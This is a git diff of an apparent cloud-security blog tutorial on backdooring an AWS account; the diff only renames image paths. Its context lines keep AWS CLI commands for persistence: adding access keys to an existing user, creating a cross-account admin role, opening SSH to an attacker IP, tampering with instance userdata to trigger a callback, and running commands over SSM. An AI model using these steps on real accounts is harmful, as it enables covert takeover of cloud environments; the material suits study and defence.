@@ -6,7 +6,7 @@ comments: false
 categories: [Cloud-Security, AWS]
 tags: [cloud security, aws] # TAG names should always be lowercase
 image:
-  path: /assets/img/posts/backdooring-an-aws-environment/01.png
+  path: /assets/img/posts/methods-to-backdoor-an-aws-account/01.png
   alt: Credits to @rez0 for this image
 ---
 
@@ -60,7 +60,7 @@ We will start by listing all users in the target account and then selecting one 
 aws iam list-users
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-03-03-List-Existing-Users.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-03-03-List-Existing-Users.png)
 _Listing users in the current account_
 
 Here, we were selected a user `backdoor-case-03-user`. Next, we will list the active keys of this user, and once we are sure that they only have 1 key right now, we will create another for them and save it for our later use:
@@ -73,7 +73,7 @@ aws iam list-access-keys --user-name backdoor-case-03-user
 aws iam create-access-key --user-name backdoor-case-03-user
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-03-04-List-and-Create-Access-Key-of-Existing-User.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-03-04-List-and-Create-Access-Key-of-Existing-User.png)
 _List and create an access key for the specified user._
 
 We can save the `Access Key` locally and can use it later on.
@@ -108,7 +108,7 @@ Creating a temporary access key is just a command away. In return, we will get a
 aws sts get-session-token --duration-seconds 129600 # 36 hours
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/02-Create-Temp-Access-Keys.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/02-Create-Temp-Access-Keys.png)
 _Creating temporary access key of current user_
 
 Now all we need to do is to export these keys and use them. We can always generate a new one whenever the current one expires.
@@ -153,7 +153,7 @@ Where the `xxxxxxxxxxxx` is the AWS account-ID of the account that we control. L
 aws iam create-role --role-name backdoor-case-02 --assume-role-policy-document file:///home/mystic/policies/assume-role-policy.json
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-02-01-Create-Role.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-02-01-Create-Role.png)
 _Creating new role_
 
 Next, we will attach the `AdministratorAccess` managed policy to this role to have full control once we assume it later on.
@@ -168,7 +168,7 @@ All that's left now is to assume this role. We can do that using the `sts assume
 aws sts assume-role --role-arn arn:aws:iam::xxxxxxxxxxxx:role/backdoor-case-02 --role-session-name backdoor-case-02-session --profile attacker
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-02-02-Assume-Role.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-02-02-Assume-Role.png)
 _Assuming a role_
 
 In response, we get the `access key id`. `secret access key`, and the `session token` of our backdoored role. Now whenever we need access to this account, we can simply use the above command to assume this role.
@@ -192,7 +192,7 @@ First, let's create a new security group:
 aws ec2 create-security-group --group-name backdoor-case-04-group --description "Testing Backdoor-case-04" --vpc-id vpc-xxxx --region eu-central-1
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-04-01-Creating-New-Group.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-04-01-Creating-New-Group.png)
 _Creating new security group_
 
 Note the `GroupId` as we will need it for the `--group-id` argument in next commands. 
@@ -203,7 +203,7 @@ Next, we will add inbound rules that would allow connections over port `22` from
 aws ec2 authorize-security-group-ingress --group-id sg-xxxxx --region eu-central-1 --protocol tcp --port 22 --cidr 10.10.10.10/32
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-04-02-Adding-Ingress-Rules.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-04-02-Adding-Ingress-Rules.png)
 _Adding ingress rules_
 
 Lastly, we need to assign this group to our target EC2 instance:
@@ -212,7 +212,7 @@ Lastly, we need to assign this group to our target EC2 instance:
 aws ec2 modify-instance-attribute --instance-id i-xxxxx --groups sg-xxxx sg-xxxx --region eu-central-1
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-04-03-Attaching-New-Group-To-Target-Instance.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-04-03-Attaching-New-Group-To-Target-Instance.png)
 _Attaching security group to target ec2 instance_
 
 > Note that we have used two group IDs in the above command, the 1st is the [default security group](https://docs.aws.amazon.com/vpc/latest/userguide/default-security-group.html) ID and the 2nd is our newly created group's ID.
@@ -239,7 +239,7 @@ We will start by first stopping our target instance so that we can update its us
 aws ec2 stop-instances --instance-ids i-xxxxxx --region eu-central-1
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-05-01-Stopping-Instance.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-05-01-Stopping-Instance.png)
 _Stopping an instance_
 
 
@@ -286,7 +286,7 @@ Now we will modify the userdata script for our target instance that we just stop
 aws ec2 modify-instance-attribute --instance-id i-xxxxxx --attribute userData --value file://userdata.b64.txt --region eu-central-1
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-05-03-Modifying-UserData-of-Instance.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-05-03-Modifying-UserData-of-Instance.png)
 _Modifying the userdata attribute of an instance_
 
 
@@ -296,12 +296,12 @@ Now all that's left is to start the instance:
 aws ec2 start-instances --instance-ids i-xxxxx --region eu-central-1
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-05-04-Starting-instance.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-05-04-Starting-instance.png)
 _Starting an instance_
 
 We should get an HTTP request on our server as soon as the instance starts:
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-05-05-Command-Executed-on-Target-Instance.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-05-05-Command-Executed-on-Target-Instance.png)
 _HTTP request on our burp collaborator_
 
 
@@ -329,7 +329,7 @@ After we have the instance ID, we can proceed to run any shell command on it:
 aws ssm send-command --instance-ids i-xxxxx --document-name "AWS-RunShellScript" --parameters commands="id;hostname" --region eu-central-1 --profile victim
 ```
 
-![](/assets/img/posts/backdooring-an-aws-environment/case-06-01-SSM-RunCommand-Executed.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-06-01-SSM-RunCommand-Executed.png)
 _Executing commands on ec2 instance remotely_
 
 Note the `Commandid` from the response as it is required for our next command to show the command output:
@@ -337,7 +337,7 @@ Note the `Commandid` from the response as it is required for our next command to
 ```bash
 aws ssm list-command-invocations --command-id "e76fb1b8-xxxx-xxxx-xxxx-710d0d977f66" --details --region eu-central-1 --profile victim
 ```
-![](/assets/img/posts/backdooring-an-aws-environment/case-06-02-SSM-RunCommand-Output.png)
+![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-06-02-SSM-RunCommand-Output.png)
 _Output of our previous commands_
 
 > Here we have used `id;hostname` commands to just print the user details and host name of our target EC2 instance. In an actual scenario, an adversary would use a command that could download a malicious file to this instance and run it, add a cron job to send a reverse shell to the attacker periodically, or simply send the Attached roles Keys to the attacker-controlled server.
